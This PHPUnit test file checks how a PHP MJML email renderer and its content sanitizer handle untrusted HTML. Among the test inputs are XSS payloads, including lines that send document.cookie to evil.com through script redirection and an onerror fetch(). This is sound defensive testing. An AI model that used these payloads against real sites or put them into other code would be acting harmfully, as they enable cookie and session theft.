<?php

declare(strict_types=1);

/*
 * This file is part of the PHP-MJML package.
 *
 * (c) David Gorges
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace PhpMjml\Tests\Unit\Security;

use PhpMjml\Component\Registry;
use PhpMjml\Parser\MjmlParser;
use PhpMjml\Preset\CorePreset;
use PhpMjml\Renderer\Mjml2Html;
use PhpMjml\Security\EmailContentSanitizer;
use PHPUnit\Framework\TestCase;

/**
 * Integration tests demonstrating security behavior of the MJML renderer.
 *
 * These tests document the expected security characteristics of the library
 * and serve as a reference for security-conscious usage.
 */
final class ContentSecurityTest extends TestCase
{
    private Mjml2Html $renderer;

    protected function setUp(): void
    {
        $registry = new Registry();
        $registry->registerMany(CorePreset::getComponents());
        $this->renderer = new Mjml2Html($registry, new MjmlParser());
    }

    /**
     * IMPORTANT: This test documents that mj-text renders content as-is.
     *
     * The mj-text component does NOT sanitize its content because it's designed
     * to support rich HTML content. This is by design and matches the behavior
     * of the JavaScript MJML library.
     *
     * When using untrusted content with mj-text, YOU MUST sanitize the content
     * yourself using EmailContentSanitizer before embedding it in MJML.
     */
    public function testMjTextRendersContentAsIs(): void
    {
        // This demonstrates the raw rendering behavior - scripts ARE rendered
        $mjml = <<<'MJML'
            <mjml>
              <mj-body>
                <mj-section>
                  <mj-column>
                    <mj-text><script>alert(1)</script>Hello</mj-text>
                  </mj-column>
                </mj-section>
              </mj-body>
            </mjml>
            MJML;

        $result = $this->renderer->render($mjml);

        // Script IS present in output - this is expected behavior!
        $this->assertStringContainsString('<script>alert(1)</script>', $result->html);
        $this->assertStringContainsString('Hello', $result->html);
    }

    /**
     * Demonstrates the correct way to handle untrusted content.
     */
    public function testSanitizeBeforeEmbedding(): void
    {
        // Untrusted user input
        $userContent = '<script>alert("XSS")</script><p>User message</p>';

        // CORRECT: Sanitize BEFORE embedding in MJML
        $sanitizer = new EmailContentSanitizer();
        $safeContent = $sanitizer->sanitize($userContent);

        $mjml = <<<MJML
            <mjml>
              <mj-body>
                <mj-section>
                  <mj-column>
                    <mj-text>{$safeContent}</mj-text>
                  </mj-column>
                </mj-section>
              </mj-body>
            </mjml>
            MJML;

        $result = $this->renderer->render($mjml);

        // Script is NOT present - sanitizer removed it
        $this->assertStringNotContainsString('<script>', $result->html);
        $this->assertStringContainsString('User message', $result->html);
    }

    /**
     * Documents that HTML attributes ARE properly escaped.
     *
     * Attributes like titles, alt text, etc. are safely escaped to prevent
     * attribute injection attacks.
     */
    public function testAttributesAreEscaped(): void
    {
        $maliciousTitle = '" onclick="alert(1)"';
        $escapedTitle = htmlspecialchars($maliciousTitle, \ENT_QUOTES, 'UTF-8');

        $mjml = <<<MJML
            <mjml>
              <mj-body>
                <mj-section>
                  <mj-column>
                    <mj-button href="https://example.com" title="{$escapedTitle}">Click</mj-button>
                  </mj-column>
                </mj-section>
              </mj-body>
            </mjml>
            MJML;

        $result = $this->renderer->render($mjml);

        // The onclick should be escaped, not executable
        $this->assertStringNotContainsString('onclick="alert(1)"', $result->html);
        // The escaped version should be present
        $this->assertStringContainsString('&quot;', $result->html);
    }

    /**
     * Documents that mj-raw also renders content as-is.
     */
    public function testMjRawRendersContentAsIs(): void
    {
        $mjml = <<<'MJML'
            <mjml>
              <mj-body>
                <mj-section>
                  <mj-column>
                    <mj-raw><div onclick="alert(1)">Raw content</div></mj-raw>
                  </mj-column>
                </mj-section>
              </mj-body>
            </mjml>
            MJML;

        $result = $this->renderer->render($mjml);

        // Raw content IS rendered as-is - this is expected!
        $this->assertStringContainsString('onclick="alert(1)"', $result->html);
    }

    /**
     * Documents the recommended workflow for processing user content.
     */
    public function testRecommendedSecurityWorkflow(): void
    {
        // Simulate various types of malicious input
        // Note: CSS-based attacks (like url(javascript:)) are not fully sanitized
        // as they are handled by email clients which strip most CSS anyway
        $maliciousInputs = [
            '<script>document.location="https://evil.com?c="+document.cookie</script>',
            '<img src=x onerror="fetch(\'https://evil.com/steal?data=\'+document.cookie)">',
            '<a href="javascript:alert(document.domain)">Click me!</a>',
        ];

        $sanitizer = new EmailContentSanitizer();

        foreach ($maliciousInputs as $input) {
            $sanitized = $sanitizer->sanitize($input);

            // Build MJML with sanitized content
            $mjml = <<<MJML
                <mjml>
                  <mj-body>
                    <mj-section>
                      <mj-column>
                        <mj-text>{$sanitized}</mj-text>
                      </mj-column>
                    </mj-section>
                  </mj-body>
                </mjml>
                MJML;

            $result = $this->renderer->render($mjml);

            // Verify no malicious content survived
            $this->assertStringNotContainsString('<script', $result->html);
            $this->assertStringNotContainsString('onerror=', $result->html);
        }
    }

    /**
     * Documents CSS-based attack vectors that are NOT sanitized.
     *
     * CSS attacks via inline styles are not fully sanitized because:
     * 1. Email clients strip most CSS anyway
     * 2. Complete CSS sanitization is complex and error-prone
     * 3. This matches the behavior of most HTML sanitizers
     *
     * For high-security scenarios, strip all inline styles or use strict mode.
     */
    public function testCssBasedAttacksNotFullySanitized(): void
    {
        $sanitizer = new EmailContentSanitizer();

        // This CSS attack vector is NOT blocked by default sanitizer
        $input = '<div style="background:url(javascript:alert(1))">Styled</div>';
        $output = $sanitizer->sanitize($input);

        // The style attribute is preserved (email clients will strip it anyway)
        // This is documented behavior, not a bug
        $this->assertStringContainsString('style=', $output);
    }

    /**
     * Documents that preview text is properly escaped.
     */
    public function testPreviewTextIsEscaped(): void
    {
        $mjml = <<<'MJML'
            <mjml>
              <mj-head>
                <mj-preview>&lt;script&gt;alert(1)&lt;/script&gt;</mj-preview>
              </mj-head>
              <mj-body>
                <mj-section>
                  <mj-column>
                    <mj-text>Content</mj-text>
                  </mj-column>
                </mj-section>
              </mj-body>
            </mjml>
            MJML;

        $result = $this->renderer->render($mjml);

        // Preview text should be escaped
        $this->assertStringNotContainsString('<script>alert(1)</script>', $result->html);
    }

    /**
     * Documents that title is properly escaped.
     */
    public function testTitleIsEscaped(): void
    {
        $mjml = <<<'MJML'
            <mjml>
              <mj-head>
                <mj-title>&lt;script&gt;alert(1)&lt;/script&gt;</mj-title>
              </mj-head>
              <mj-body>
                <mj-section>
                  <mj-column>
                    <mj-text>Content</mj-text>
                  </mj-column>
                </mj-section>
              </mj-body>
            </mjml>
            MJML;

        $result = $this->renderer->render($mjml);

        // Title should be escaped
        $this->assertStringContainsString('<title>&lt;script&gt;', $result->html);
    }

    /**
     * Test that the sanitizer can be customized for different security levels.
     */
    public function testCustomSanitizerConfigurations(): void
    {
        // Strict mode - only basic formatting
        $strict = new EmailContentSanitizer(EmailContentSanitizer::createStrictConfig());
        $strictResult = $strict->sanitize('<table><tr><td>Data</td></tr></table><p>Text</p>');

        $this->assertStringNotContainsString('<table>', $strictResult);
        $this->assertStringContainsString('<p>Text</p>', $strictResult);

        // Default mode - allows tables for email layouts
        $default = new EmailContentSanitizer();
        $defaultResult = $default->sanitize('<table><tr><td>Data</td></tr></table><p>Text</p>');

        $this->assertStringContainsString('<table>', $defaultResult);
        $this->assertStringContainsString('<p>Text</p>', $defaultResult);
    }
}
